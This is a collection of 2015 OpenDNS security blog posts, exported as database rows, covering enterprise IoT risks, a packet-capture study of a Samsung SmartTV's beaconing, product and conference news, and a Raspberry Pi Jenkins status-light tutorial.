patterns within spiking domains. It also serves as useful preprocessing step before further classification.', 'Security Research;Uncategorized', 'https://umbrella.cisco.com/blog/2015/06/10/spikes-and-query-patterns/');

And the personal cloud storage devices, fitness trackers, smart watches, and myriad other devices with newfound connectivity present new risks and challenges for IT departments charged with protecting their enterprise networks. This is all according to a report on IoT released by OpenDNS last week.\nSpecifically, the report lays out three distinct, “principal” risks for enterprises housing these devices:\nIoT devices introduce new avenues for potential remote exploitation of enterprise networks\nThe infrastructure used to enable IoT devices is beyond the control of the user and IT \nAnd IT’s often casual approach to IoT device management can leave devices unmonitored and unpatched\nNew Avenues for Remote Exploitation\nLike any laptop or server, IoT devices allow traffic to flow both to and from the Internet, which creates a new entry for attackers to exploit and gain entry into protected networks. This is a problem for enterprise security teams, according to Mark Nunnikhoven, senior security researcher at OpenDNS and contributing author to the report.\n“Some of these devices use an easily remembered domain name to allow the user access,” Nunnikhoven said. “That’s great for the user but also for the attacker. An attacker can collect these names and use them to attempt to access the storage directly.\nHe added that unless security teams are aware of and monitoring these devices, they may not see what could be a potentially\nAnalysis in the report shows Western Digital infrastructure is vulnerable to FREAK and other SSL flaws.\nlarge data leak. And some of the devices examined for the IoT report are vulnerable to “widely known” security flaws like FREAK and Heartbleed, which have been in the news for months.\nOutside IT’s Control\nWhen a vulnerability becomes well known and a patch is released, it relieves the potency of potential attacks that exploit it. But what happens when those attacks are perpetrated on infrastructure outside IT’s control? And how does an IT professional patch vulnerable devices that don’t belong to the company but to employees who brought them in the door?\nDevice manufacturers do not seem to be chomping at the bit to take responsibility for the security of these devices, and so far even enterprise IT and security departments are unsure as to who should assume ownership of them.\nAccording to OpenDNS’s report, these are issues companies need to consider and plan for as IoT gets more popular and more pervasive. Nunnikhoven said the lack of control over these devices forces a level of trust most IT and security professionals would not be comfortable giving.\n“IoT devices collect a lot of data. That data is typically stored and processed in the cloud via a service provided by the device manufacturer,” Nunnikhoven said. “These systems are outside of the control of the user and security team’s control. Unless\nThe report shows thousands of malicious domains were observed connected to IoT device traffic.\nyou completely block the service–which is not usually the right answer for anyone–you’re at the mercy of the provider.”\nA Casual Approach to a Serious Issue\nBecause IoT devices like thermostats, smart watches, fitness trackers, and connected personal storage devices are marketed and largely developed for consumers, that is how they are most often regarded, as gadgets or toys. That attitude carries over into the work world as more employees bring connected devices inside company walls.\nOne of the main issues when it comes to patching and updating IoT devices–an issue Google recently got involved in with the launch of Brillo–is there is no central management for them. Typically each device is a completely isolated connection that needs direct contact to update or patch.\n“ Given the personal nature [most] IoT devices, IT teams are completely out of the loop,” Nunnikhoven said. “This creates a really bad scenario when a security vulnerability is found. You’re reliant on the manufacturer issuing a patch, someone discovering that patch, and then the user installing the patch. That runs counter to security best practices and creates a lot of effort for IT teams to keep on top of the state of these devices.”\nThe 2015 IoT in the Enterprise Report suggests that IT organizations be out in front of IoT’s emergence on their networks, stating devices that connect to the internet, personal though they might be, need to be monitored and managed as closely to enterprise-grade IT equipment as possible.\nFor more on the Internet of things and the risks connected devices pose to the enterprise, read the 2015 Internet of Things in the Enterprise Report report here.', 'Blog;Labs Research;News', 'https://umbrella.cisco.com/blog/2015/06/09/iot-security-research-outlines-3-major-risks-for-businesses/');

We shared our passions for security and discussed how we approach the field of security research in our various professions.\n\nSource Boston, Day 1:\n\nThe first day of the conference began with a keynote from Jim Routh, the CISO of Aetna. He gave an insightful look at security today and the challenges we all face in attempting to keep our information private.\nJeremiah O’Connor (OpenDNS) spoke about building NLPRank, which we use at OpenDNS to identify  and block malicious behavior in network traffic with Natural Language Processing techniques. He demonstrated how the programatic use of natural language processing on DNS traffic can automatically prevent targeted phishing and related attacks in which attackers use similar domain names to the domains they are trying to impersonate. He somehow managed to squeeze a hearty discussion of NLP and linear algebra into 40 minutes!

SFText is run by Alexey Khrabrov, Chief Scientist at Nitro.  Jeremiah met Alexey through an  applied natural language processing workshop held by Gabor Melli a few months back at Galvanize. After the workshop, they spoke about how OpenDNS uses NLP and machine learning techniques to detect malicious behavior in network traffic and came up with the idea to hold a meetup for NLP and data scientists at OpenDNS. It was great to see a mix of developers, data scientists, info-sec professionals and students in the crowd. Jeremiah spoke for around 80 minutes about OpenDNS Labs research involving detection techniques that use text processing in DNS and HTTP traffic. He also discussed using Gensim, a fantastic library by Radim Řehůřek. Interaction with the crowd was lively and full of great questions.

More security flaws were reported in 2014 than ever. Of the more than 7,000 vulnerabilities added to the National Vulnerability Database, an estimated 83 percent of them were found in third-party software. And this trend is likely to continue in 2015.\nCombined with the fact that it can be incredibly hard to get insight into what unsanctioned tools and cloud services employees use on a regular basis, enterprise IT teams have good reason to be worried. Without insight, it’s difficult to track data exfiltration, or know when employees may need to reset a password because of a hack affecting a third-party tool. The good news is, if you subscribe to an OpenDNS Umbrella package, you already have access to a report that can show what services and Internet enabled devices are in your network environment, and even tie these devices to a user.\nThe Cloud Services Report provides a snapshot summary and in depth usage logs.\nThe worry on behalf of IT teams is what prompted OpenDNS to develop a cloud services discovery tool, which the San Francisco security company released August of 2014. Director of Engineering Dave Cornell and his team saw an opportunity to provide OpenDNS customers with an unprecedented insight into their network environments and what third-party cloud and SaaS tools employees were using.\n“Originally we called it the Shadow IT report,” Cornell said in an interview. “The problem we’re solving is that organizations a lot of times don’t know what tools employees are using. They’ll use whatever tool makes their job easier, condoned or not.”\nDiscovery Now Includes IoT\nOpenDNS estimates that its global data centers handle two percent of the world’s DNS requests, which includes cloud services and IoT traffic passing through enterprise networks. Leveraging such a vast knowledge of the Internet the company is able to correlate traffic to cloud app usage like DropBox in near real time. OpenDNS this week released the 2015 Internet of Things in the Enterprise Report, and in conjunction Cornell and his team added a new category to the Cloud Services Report specifically for IoT.\nThis means IT admins or security professionals auditing for internal security threats can easily determine if the Samsung Smart TV in the conference room down the hall is making calls to Korea, even when not in use.\nConsidering the risks that come with IoT, and how pervasive they’re becoming in the enterprise, being able to tie network activity from IoT devices–and cloud services in general for that matter–to an employee identity could be incredibly valuable for IT and security professionals short on time.\nThe Cloud Services Report can provide a list of active Internet enabled devices in your network.\nEasy Deployment and Off-Network Reporting\nCornell says the Cloud Services Report borrows two distinct benefits from Umbrella. One is easy deployment, since the report is included with the existing Umbrella packages, and uses the data OpenDNS already sees as a result, there’s no extra work needed on behalf of IT or infosec teams. Once DNS requests are logged, the cloud report will do its work.\nThe other advantage, Cornell said, is off-network reporting. Many existing cloud reporting tools work through proxies and get data from perimeter appliances like firewalls and IDS. Working with appliances and connecting data to a cloud report can be complex, but it also means they will not be able to catch activity once a device leaves a company’s network perimeter.\nIt’s Not All FUD\nIt’s important to note that the report’s most useful applications are not only blocking or preventing certain traffic or employee behavior. It’s also a powerful tool when justifying an IT budget, gauging use of deployed apps, or building a case to sanction a cloud solution employees already use.\nCornell states that IT leaders who make use of the report will be able to draw conclusions based on actual usage. Wondering if your team prefers Webex or Google Hangouts? Take a look at the report and see what employees are using already.\nUseful Even When Not Proactive\nSecurity professionals, much as they would like to, don’t have a crystal ball. Unfortunately this means working frantically after a breach has occurred. And if it’s a third-party that had a breach, it can be even harder determining whose login credentials or data may have been compromised. The first step is determining who uses that third-party service.\nAccording to Cornell, this is a powerful use for the Cloud Services Report. “Say company X has a cloud service and had a major data breach,” he said. “And say all customer account logins were exposed. System administrators can use this report to find who was using this service, and advise them to change passwords.” He added that because the tool records activity in near real time, reaction times to ongoing breaches or announcements from third parties can drop significantly.\nIf you are not a current subscriber and would like to experience the Cloud Services Report and find out what cloud tools and IoT devices your employees are using, OpenDNS allows access through a free trial.', 'Announcements;Blog;News;Umbrella', 'https://umbrella.cisco.com/blog/2015/06/04/a-big-ally-against-shadow-it/');

As part of the research for the report, we analyzed the network activity of a recent model Samsung SmartTV. In this post, we’ll describe the results of that analysis.\nAll of the analysis was done using direct network captures from a Samsung SmartTV model UN32H5203AF, running version 1117 of it’s on-board software, which was the most current as of the date of testing.\nThe Setup\nOne of the key questions we were looking to answer in the report was whether or not IoT devices contact external addresses on a regular basis without user interaction (otherwise known as beaconing).\nIn order to answer that question with respect to Samsung SmartTVs, we connected the display to a switch with port mirroring enabled. We then setup multiple captures using Wireshark and tshark. Initially, we captured the boot up sequence and a 2+ hour sequence while the display was sitting idle at the “Samsung Apps” page in the SmartHub functionality.\nThe results from those initial captures prompted us to gather a broader sample set over a 24 hour period.\nDuring all captures, the SmartTV was left in its default configuration. Only the wired network connection and power saving functionality was altered to allow for an extended network capture.\nInitial Analysis\nBecause we were looking for beaconing activity in the network captures, the first step we took was to extract all of the DNS requests from the packet capture using the command:\ntshark -2 -r capture.pcapng -T fields -e dns.qry.name -R \"dns.flags.response eq 0\"\nThis produced a list of all domain names queried during the capture period:\necho[.]internetat[.]tv\nns11[.]whois[.]co[.]kr\necho[.]internetat[.]tv\ncdn[.]samsungcloudsolution[.]com\ntime[.]samsungcloudsolution[.]com\nprov[.]samsungcloudsolution[.]com\nwww[.]worldtimeserver[.]com\nusecho[.]internetat[.]tv\ninfolink[.]pavv[.]co[.]kr\nfkp[.]samsungcloudsolution[.]com\notnprd10[.]samsungcloudsolution[.]net\nwww[.]samsungotn[.]net\nwww[.]samsungrm[.]net\nvd-emp-prd[.]s3[.]amazonaws[.]com\notnprd9[.]samsungcloudsolution[.]net\naz43064[.]vo[.]msecnd[.]net\ndly2224qfzjce[.]cloudfront[.]net\n0[.]north-america[.]pool[.]ntp[.]org\ngallery[.]tv[.]widgets[.]yahoo[.]com\nlcprd1[.]samsungcloudsolution[.]net\nnotice[.]samsungcloudsolution[.]com\nd1jwpcr0q4pcq0[.]cloudfront[.]net\nxpu[.]samsungelectronics[.]com\nlcstg2[.]samsungcloudsolution[.]net\notnprd8[.]samsungcloudsolution[.]net\notnprd11[.]samsungcloudsolution[.]net\nFor each of these domains, we pulled the records returned from the queries and then searched for the number and timing of each connection to these domains over the course of the capture. We were able to extract this data using a similar tshark command:\ntshark -2 -r capture.pcapng -T fields -e ip.src -e frame.time_relative -R \"ip.dst == 1.2.3.4 and ip.src == 10.0.0.33\"\nWhere 10.0.0.33 was the IP address assigned to the SmartTV and “ip.dst” was repeated as required to match the A records resolved from the initial domain records.\nResults\nCompiling the data using the technique described above provided several candidate domains that may be active for beaconing activity:\nlcprd1[.]samsungcloudsolution[.]net\nd1jwpcr0q4pcq0[.]cloudfront[.]net\nwww[.]samsungotn[.]net\naz43064[.]vo[.]msecnd[.]net\notnprd11[.]samsungcloudsolution[.]net\notnprd10[.]samsungcloudsolution[.]net\notnprd9[.]samsungcloudsolution[.]net\notnprd8[.]samsungcloudsolution[.]net\nxpu[.]samsungelectronics[.]com\nInitial examination of the domain names hint that the four otnprd* domains are similar in nature. Further analysis of the content of the DNS records shows that they can be treated as a single destination for the purposes of our analysis.\nFor each of these domains, graphing the network activity outbound from the SmartTV produces the following figures:\n\n\n\n\n\n\n\n\n\n\nBased on these patterns, all of the these domains except for lcprd1.samsungcloudsolution.net exhibit in beaconing type activity.\nPossible Reasons\nAfter examining the DNS records and packet capture in further detail for the remaining candidate beaconing domains, their speculated use is explained below.\nd1jwpcr0q4pcq0.cloudfront.net\nAmazon CloudFront is a content delivery network from AWS. The SmartTV is regularly downloading small amounts of data from a distribution on CloudFront. The transaction is encrypted so the contents were not analyzed, but it would be logical to assume that this is a method the SmartTV uses to keep its application caches (latest videos, available apps, etc.) fresh.\nwww.samsungotn.net\nThis record contains to a CNAME which points to otnopenapiwww.cloudapp.net. .cloudapp.net indicates a web application or service hosted in Microsft’s Azure environment.\nThe SmartTV communicates regularly to this application and requests a relatively consistent amount of information. Given the other domains that make periodic requests, it is likely that this is also an application that provides regular updates to content that the SmartTV ensures is up to date.\naz43064.vo.msecnd.net\nmsecnd.net is the primary domain for Microsoft’s Windows Azure Content Delivery Network. The SmartTV is regularly downloading small amounts of data from an endpoint on this network. Similar to the communications to d1jwpcr0q4pcq0.cloudfront.net, the transaction is encrypted so the contents were not analyzed but it would be logical to assume that this is a method that the SmartTV uses to keep it’s application caches (lastest videos, available apps, etc.) fresh.\notnprd-11, 10, 9, 8.samsungcloudsolution.net\nThe set of otn-prd- domains resolve to Amazon Elastic Load Balancers. These are commonly deployed in front of applications hosted in AWS to ensure that performance and availability goals are met.\nxpu.samsungelectronics.com\nThis domain is the outlier for this analysis. Communication to the domain displays the rough pattern:\n10 attempts 5 minutes apart, wait 45 minutes before attempting another 10 times\nThis pattern was surfaced by view communications with each domain on a minute by minute basis. This pattern is so pronounced it is actually visible in the global view of all traffic (that OpenDNS sees which is 2% globally) as shown below:\nAttempted communications with xpu.samsungelectronics.com follows the same pattern consistently:\nThe SmartTV resolves the domain to 54.245.219.101 (an A record)\nThe SmartTV then sends a single packet TCP SYN packet to 54.245.219.101\nIn return 54.245.219.101 attempts to send a single ICMP packet to the SmartTV\nThis appears to be the start of a standard TCP 3-way handshake but the response is an ICMP packet that is blocked on the testing network, so if there is additional behaviour to this pattern we did not see if during testing.\nThis is odd behaviour and there doesn’t appear to be a straightforward answer as to why this communications pattern is occurring and to what end.\nAdditional Domains\nThis set of domains was compared to the unique dataset we have at OpenDNS, and none of these domains are currently flagged for malicious activity.\nWe also looked at co-occurring domains and found these additional Samsung domains:\nprov[.]samsungcloudsolution[.]com\nupu[.]samsungelectronics[.]com\ndev-multiscreen[.]samsung[.]com\nsca[.]samsung[.]com\nlog-3[.]samsungacr[.]com\nlog-1[.]samsungacr[.]com\napi-hub[.]samsungyosemite[.]com\nrd[.]samsungadhub[.]com\nnotice[.]samsungcloudsolution[.]com\ntest[.]samsungrm[.]net\namauthprd[.]samsungcloudsolution[.]com\nabtauthprd[.]samsungcloudsolution[.]com\ngpm[.]samsungqbe[.]com\nmultiscreen[.]samsung[.]com\noempprd[.]samsungcloudsolution[.]net\ntime[.]samsungcloudsolution[.]com\nnoticefile[.]samsungcloudsolution[.]com\nvdterms[.]samsungcloudsolution[.]com\nus-api[.]samsungyosemite[.]com\nosb[.]samsungqbe[.]com\nauth[.]samsungosp[.]com\nacr0[.]samsungcloudsolution[.]com\nsas[.]samsungcloudsolution[.]com\nad[.]samsungadhub[.]com\nThese domains were not observed during the analysis but our data set shows that—to varying degrees—these domains are usually looked up close to one another. They may be resources used for other Samsung services or devices.\nConclusion\nNothing directly malicious was found in the examination of the Samsung SmartTV’s network communications, however the behavior of xpu.samsungelectronics.com does not fit into any logical use case. Additionally, the frequency with which the SmartTV makes requests to this domain make it significantly easier for Samsung or a malicious actor to track the overall usage of the device.\nThe average user does not expect their SmartTV to be making external calls to various services without any interaction. The fact that the SmartTV does so almost every minute it’s powered on even without an user interaction is concerning because it makes the use of these devices much simpler to determine from outside of their initial environment.\nIn an enterprise environment, you should be aware of this activity. These displays are quite noisy on the network. It can be used to establish a baseline of “normal” activity for these displays. You can use that baseline in order to help detect anomalous activity. The apps that run on these displays run in a webkit-based sandbox. That means that they may be susceptible to common webkit vulnerabilities which you should be monitoring for.\nTo learn more about the context of this research as well as results of our analysis of other devices, please be sure to read the full report. Let me know what you think on Twitter where I’m @marknca and the team is @opendnslabs.', 'Big Data;Events;Security Research', 'https://umbrella.cisco.com/blog/2015/06/02/samsungs-chatty-smarttvs/');

That talk kicked off a year-long process for Hay that would lead to him combing through terabytes of network traffic logs from around the world, organizing late night hacking sessions on Internet-connected TVs, and alerting multiple IoT infrastructure providers on exploitable vulnerabilities in their own systems. After months of detailed research, Hay says that he and the rest of the OpenDNS Security Labs team are ready to publicly share the first data-driven research paper that analyzes the security risks present in the enterprise Internet of Things.\nThe report, titled the “The 2015 Internet of Things in the Enterprise Report” and available today on the OpenDNS website, provides a never-before-seen look into the security implications of IoT devices used in modern business environments. Using anonymized data collected from over ten thousand networks during the first three months of 2015, the report not only identifies the IoT devices that are most prevalent in the enterprise, but also reveals serious vulnerabilities that were discovered in the infrastructure used to connect these devices to the Internet.\n“I didn’t think that I’d be dedicating this much time or resources to the research, because I thought I would just find some toys that were beaconing out to the Internet,” said Hay. “I didn’t expect to find consumer storage devices in regulated industries that are uploading data to the Internet. I didn’t expect them to be connecting to infrastructure that was susceptible to patchable vulnerabilities.”\nHay says that his first interest in IoT security came after he was invited to speak at the 2014 SANS Digital Forensics and Incident Response Summit in Austin, Texas. As part of a series of lightning talks, Hay delivered a six minute presentation called the “Internet of Perjury (IoP): Asset Identification and Confirmation.” Many of the key points laid out in that talk, such as how analysts could identify the IoT devices on their own networks, how they can analyze the security implications of those devices, and what security risks are presented by different IoT device categories, were not being widely discussed by information security professionals.\n“How prevalent are these devices? How exploitable are they? How concerned should we be from a law enforcement perspective, in terms of using them for digital evidence? When I looked around before presenting this talk, nobody seemed to know,” said Hay.\nAct I: The Plan\nWhen asked about what sets this report apart, Hay points to the fact that the report is not only data-driven, but that it is the first of its kind to use traffic from live enterprise networks. He knew that by drawing on OpenDNS’s unique view into the network traffic requests of over 10,000 businesses around the world, he would be able to see more IoT device traffic from a global perspective than almost anyone else. But collecting data on IoT devices still wasn’t going to be easy.\n“When we first started to look at the popular IoT devices that people use, we found the actual documentation to be really sparse,” said Hay. “They didn’t tell you what networks or domains to allow and there was often no information about networking at all beyond ‘make sure this device can talk to the Internet using HTTP or HTTPS.’ This goes against what security people have been taught, in terms of locking down communications for any device on the network.”\nAct II: The Data\nHay then began using OpenDNS’s Investigate tool, supplemented with IoT device API documentation and published research from third-party sources, to begin building a list of key indicators for the network traffic from most of the popular IoT devices. For devices ranging from Fitbit wearable trackers and Western Digital My Cloud personal hard drives to Samsung Smart TVs, Hay could use these indicators to cross-reference the device queries with a list of anonymized enterprise organization IDs. From there, he could identify the devices that are present in specific industry verticals.\nIdentifying which services the IoT devices were querying gave Hay a list of the infrastructure that the devices were relying on to provide updates, store data and more. Using third-party tools such as the SHODAN search engine, Filippo Valsorda’s Heartbleed Test and Qualys SSL Labs’ online scanner, Hay could then sequentially examine the backend infrastructure to see which domains were secure and which ones contained obvious vulnerabilities that could put enterprise users’ data at risk.\nAct III: The Results\nDespite containing billions of combinations of domain names, origin and destination IP addresses, Hay says that the data quickly revealed specific security information once he applied the right tools. IoT devices were long ago identified as potential problems for the enterprise, due to how difficult it is to patch them and the fact that they often transmit data without the user’s knowledge. Not only are these problems also associated with the Internet connected USB hard drives and smart TVs found in some of the world’s most highly-regulated industries (including the oil and gas, healthcare and financial services verticals), but the infrastructure supporting these devices contains security issues, as well.\nThe most prominent consumer storage devices found in the enterprise were Western Digital My Cloud hard drives. In addition to the risk that sensitive data could be uploaded to the cloud by employees, previous research showed  that these hard drives are susceptible to a configuration flaw that could make the data on the drives show up in Google search engine results.\nSamsung Smart TVs, by far the most widely-used devices of their kind, essentially act as web servers behind the firewall. In addition to the TVs acting as a potential route for network compromise, they continually beacon out to an online service that may or may not be maintained by the device manufacturer (Hay says that Samsung had not responded to his inquiries at the time of publication) — another possible way for bad actors to take over a device on an enterprise network.\n“These devices are making their way into our corporate networks, but they’re not being treated with the same care and due diligence that we treat enterprise appliances,” said Hay. “We’re just plugging these into the sensitive networks, when they’ve been designed for the home and tested only as a consumer device.”\nSeveral IoT hosting platforms were also found to contain known vulnerabilities. One case, Hay found an IoT service that was vulnerable to the Heartbleed vulnerability, a serious and highly-publicized SSL flaw first revealed in April 2014 (the service has since been patched). Dozens of other domains were vulnerable to the FREAK vulnerability or used older, insecure cryptography to encrypt the traffic from IoT devices. Hay said that he worked with several vendors prior to the report’s release to make sure the flaws in their systems were patched.\nHay says that an even bigger and potentially more troubling prospect is the idea that older devices may rely on infrastructure that is eventually moved or not maintained.\n“Some of the issues that are known with medical devices, specifically is that they run embedded operating systems that are rarely patched or protected,” he said. “These are beaconing out to the Internet for updates, to domains that have the potential for being hijacked or even disrupted. That’s an obvious security concern.”\nA year later, Hay says that his work on IoT research is still unfinished. In his original talk, he spoke about creating a way to share data on IoT devices with other security professionals and researchers–something that he hopes this report will partially achieve. He’s also interested in building on the work he’s done thus far with more in-depth analysis of IoT devices in a controlled laboratory environment. Hay also points to the Cloud Security Alliance’s work on early IoT adoption as a good place to start for security professionals who are looking for guidance on how to secure their networks and IoT devices.\n“It’s inevitable that more standards, programs and best practices will be built to guide the safe adoption of IoT devices in the enterprise,” he said. “I think there needs to be a partnership between new IoT startups and the security industry to make sure that device manufacturers are operating safely and securely.”\nAs part of our efforts to help security professionals gain better awareness and visibility for IoT use in their businesses we have updated the Cloud Services Report feature — available to customers through the Umbrella platform dashboard — to now identify the IoT devices present on their networks. The Cloud Services Report feature helps security professionals determine whether employees are using the cloud services sanctioned by their company’s IT department or other, unapproved services.

Famous cyberpunk writers such as William Gibson in Neuromancer or Neal Stephenson in Snowcrash have explored the concept artisticly. Many movies have attempted to represent the infinite possibilities and dangers of virtual reality : The Matrix, Tron, Hackers, and so many others. A lot of us still remember the days of the mighty Power Glove and the first adaptations to video games. All of these references, which are now classics, had one thing in common: A true fascination for an alternate digital reality.\nFast forward to our modern technology era, the 3D reality landscape has significantly changed. Data centers can now store a massive amount of information and data visualization has become the new playground for building accurate visual analytics ready for interpretation. One not-so-used approach to handle large quantities of entry points is to accelerate the computation and rendering on GPUs. These methods have been extensively used in physics simulation or medical imaging and it’s no suprise that we’re progressively seeing them becoming mainstream for more abstract-oriented data visualization. Recent graphic cards can render several millions of triangles per second in realtime, they can also run physics and audio effects in parallel. Minus the game design work, data visualization requirements are definitely not so far from gaming ones but yet the technology remains under-used. So what are we waiting for? Clearly, there is still a long way to go.\n\nA Common Misconception\nWhen you hear the words “3D Graphics”, chances are you are thinking of “projected 3D”. The first things that come to mind are 3D movies, 3D TV, video games or maybe augmented reality. All of those examples actually referring to animations projected onto a flat surface. Indeed, there is a difference: Real 3D refers to a true three-dimensionnal space similar to the one you experience everyday, on the other hand projected 3D defines a set of methods to create the illusion of a real 3D space. Subtle difference but nonetheless important : In projected 3D, you are always limited by the rendering device, the size of your TV, the definition of your monitor.\nNow what does that tell us? As we integrate state-of-the-art 3D rendering techniques into our modern data visualization engines, the exploration of this data will always suffer from the device limitations, therefore our interpretation biased. The human brain is arguably the most powerful visual processor but its performance is certainly not infinite. There is a limit of what we can perceive and understand: Most of the time, data scientists have to deal with multi-dimensional sets of sophisticated features. We can only efficiently use 3 spatial + 1 temporal dimension, some spectral ones (Color, Temperature…) and it is unfortunately not enough.\nIf the first barrier is visual, the second one is more conceptual. The true potential of 3D visualization will only be unlocked with a smart combination of realistic 3D graphics, flawless virtual reality devices, powerful data analytics skills, and intuitive UI/UX design.\nHere are 2 famous futuristic predictions made by Raymond Kurzweil, Director of Engineering at Google:\n“In 2019, the computational capacity of a $4,000 computing device (in 1999 dollars) is approximately equal to the computational capability of the human brain (20 quadrillion calculations per second).”\n“In 2019, people experience 3-D virtual reality through glasses and contact lenses that beam images directly to their retinas (retinal display). Coupled with an auditory source (headphones), users can remotely communicate with other people and access the Internet.”\n\nThe Beginning of a New Era\nThis evolution will redefine the limits of what we currently know. The majority of the interfaces we use today are designed to work in two dimensions and we have come a long way. With the advances of virtual & augmented reality, it feels pretty obvious that our interfaces will follow the movement. As the devices and technology evolves, the feeling of immersion will improve and the user will constantly navigate between 2 worlds. Now this leads to interesting questions, especially for data visualization:\nHow would you take advantage of the 3 dimensions to efficiently structure & represent data?\nWhat physics laws would you keep, remove, modify or enhance to make navigation intuitive?\nHow does the user interact with his world?\nAbout 80% of the population is composed of visual learners, it is pretty safe to say that the visual aspect of an interface is the most important one. However it is not enough for a true illusion of alternate reality. Integrating other senses are mandatory for a realistic immersion feeling. Sound is a big one as it defines our perception of space, we all can pretty accurately locate a source of sound even if our eyes are closed.\nAlso, that last question leads to interesting thoughts: User interaction is mainly about mapping human movements or states to virtual actions but how does the user perceive his own self in a virtual world? For instance, if I am wearing a head mounted display (Such as the Oculus Rift), chances are that I can’t see my real hands or the mouse/keyboard. It makes the immersion illusion even more challenging. Similarly, speech is our easiest way to communicate elaborated information between humans, should we develop the same ability with our human-machine interfaces?\nClearly, the possibilities are endless and the more we learn about the human body, the more we will be capable of designing ergonomic interfaces. A lot of existing and emerging new technologies are on the verge of enabling such capabilities and there is no doubt that they will be part of the workstation of the next generation.\n\nOpenGraphiti\nFor the occasion of the RSA conference in San Francisco, we had to bring our A game and demonstrate our improvements of our data visualization engine.

If you can’t, then it’s not.” This definition is finding new ground in the cybersecurity field.\nTo anyone keeping tabs–even casually–it’s obvious the security industry is going through sweeping changes. High-yield targets are cheaper and easier than ever to compromise, and many companies don’t seem prepared to stop even basic attacks.\nThe changes info security companies are implementing, according to OpenDNS’s Executive VP of Engineering Brian Roddy, are a result of the rapidly growing number of threats security professionals are facing. Most companies do not have the security workforce necessary to monitor and respond to every threat under the sun. The RSA 2015 conference illustrated clearly that most vendors in the industry are operating behind evolving attackers–who move quickly–while using methods and technology that cannot keep up.\nAccording to Roddy, all the change is driving two major trends that could help security vendors keep pace. First, cloud-delivered security will become the standard. “Nearly everything on the Internet is now delivered through the cloud, and security will be no different,” he said. “Even if you have a local security appliance on your network, it likely still gets its updates from the cloud.”\nLike the Internet of the early 2000s, the cloud is becoming majorly important to security. From nearly instantaneous updates to lowered overhead on administration, cloud security offers equally as many benefits as it does to everyday Internet services. Read more on those benefits here.\nThe second trend, according to Roddy, is apparent in every major security player’s marketing, from Bit9 to McAfee to Intel. Every company serious about security is also serious about transforming into a platform. Similar to nearly a decade ago, when Andreessen was writing about the importance and growth of application development platforms, IT security vendors are now embracing the functionality and freedom platforms provide to security professionals who are fighting a losing battle.\nRoddy added platform adoption is the key to expanding a company’s security capability past where the traditional model could ever take it. And one of the biggest benefits is in the speed of change cloud platforms provide. “With appliances you will occasionally gets updates from the cloud,” he said. “But the approval process for changes to these appliances are typically at least six months to a year behind.” And he notes that six months is likely very generous.\nThough it doesn’t speak to the entire security industry, a Boston-based security audit company recently found nearly 95 percent of all SAP systems deployed are woefully behind on their security updates, leaving them open to known and patchable vulnerabilities. Admittedly, SAP systems present unique challenges in keeping updated–mainly that they do not fit into a typical vulnerability management program. But this gives an insight to the scale of the issue. Appliances and legacy technologies do not move at the speed of modern day attacks.\nIn order to fight new threats, the security industry is slowly embracing the need for vendors to share, which is a big component to both cloud delivery and platforms. For some security companies, intelligence sharing is a bit of a problem, Roddy said.\n“Because [security so far] has been an appliance-based model, it hasn’t been easy to share intelligence and data,” he said. The challenge is a technical one, but also a business model issue. In order to share, security companies have to free up their intelligence feeds, which are often guarded like the “secret sauce” of the industry.\nBut sharing, according to some industry professionals, is key to making a company’s security stack fully functional across vendors and disciplines. Andy Pendergast, product director at ThreatConnect, explains it like this, “Aggregating intelligence and pushing it as a feed does not qualify as a platform–threat intelligence, security or otherwise,” he said. “What makes any platform is extensibility–its ability to grow to future requirements.”\nWhat he specifically means in the case of a threat intelligence platform is having the ability to take a data feed from any security source, process it with a custom API, vet it for relevance and validity, and plug the refined intelligence into any number of other enforcement solutions.\n“Enabling interoperability between systems and intelligence sources is a linchpin feature of any security platform. The entire industry is moving toward interoperability, if not somewhat slowly.” He added that the demand is there, however. ThreatConnect estimates that 40 percent of Fortune 100 organizations have adopted security sharing through extensible threat intelligence platforms.\nGoing back to Andreessen’s description of platforms–even though he was describing what would be the future of Internet platforms from companies like Google, Facebook, and Amazon–the true separator of good security platform technology, is in the ability for an infosec team to use it in whatever way works best for them, to convert their intelligence feeds into enforcement where they need it most. If this is not possible, it’s not a security platform.', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/05/27/platform-and-cloud-two-trends-are-driving-what-works-in-security/');

I used python 2.7.3 for this project, which was preinstalled on the Pi. I recommend using virtualenv to install your python dependencies. It’s a good habit to get into and keeps things tidy. You need to first ssh pi@ipaddress and install these from the command line of the Pi. Most of these will require sudo.\n$ sudo apt-get update\n$ sudo apt-get upgrade\n$ sudo apt-get install python-pip\n$ sudo apt-get install python-dev\n$ sudo apt-get install git\nInstall Bibliopixel for LED bliss\nDownload and install the latest from github\n$ git clone git@github.com:ManiacalLabs/BiblioPixel.git\n$ cd BiblioPixel\n$ sudo python setup.py install\n$ sudo pip install -r requirements.txt\nReboot once everything is installed\n$ sudo reboot\nLED drivers\nBibliopixel should’ve included multiple drivers to choose from. We’re using the LPD8806. Once it’s installed (and SPI is enabled) you should see the device in your dev directory on your Pi:\n$ ls -la /dev/spidev*\ncrw-rw---T 1 root spi 153, 0 Jan  1  1970 /dev/spidev0.0\nNow for the fun part, playing with LEDs!\nI wrote a simple python script that utilizes threads and a queue. Using a queue is one way to communicate between threads with the added bonus that it’s thread safe. The change of color can be thought of as an event and your event pool as a handler. When an event is emitted, the appropriate candidate responds with it’s particular color or animation.\nThe color changes I’m using in my script are very simplistic on/off color changes but Bibliopixel provides some very fun pre-written animations that you might try modifying, for example:\n\nClone the latest copy of the jenkins status light script:\n$ git clone https://github.com/opendns/jenkins-status-light\n$ cd jenkins_status_light\n$ sudo pip install -r requirements.txt\nManually running the script\nSimply supply the jenkins host and job name as command line arguments to run:\n$ sudo python jenkins_status_light.py --jenkins-url https://jenkins.example.com --job job-name\nIt’s working!\nAt this point if the script didn’t exit you should see LEDs come up for the current build status of Jenkins and change whenever Jenkins build status change from success, failure or aborted. But if the script did exit, you’ll need to read through your console to see what is failing and address that.\nChanging colors\nThe colors I selected might not be what you want, but you can easily swap out predefined colors in the global section at the top of my script. There’s a ton of them if you scroll to the bottom of this page.\nSupervisor\nOnce things are working then we should try wrapping our script with Supervisor. This provides us with monitoring and helps keep the script running. If our lighting script exits or crashes for any reason, Supervisor will restart it. As an added bonus, when you plugin the Raspberry Pi, the script will automatically run and the lights come right up!\nAs the root user, run the following command to install the Supervisor package:\napt-get install supervisor\nLet’s add a configuration file to tell Supervisor where our jenkins_status_light.py file is and what to do with it. Save the file at /etc/supervisor/conf.d/jenkins_status_light.conf.\n[program:jenkins_status_light]\ncommand=/usr/bin/env python 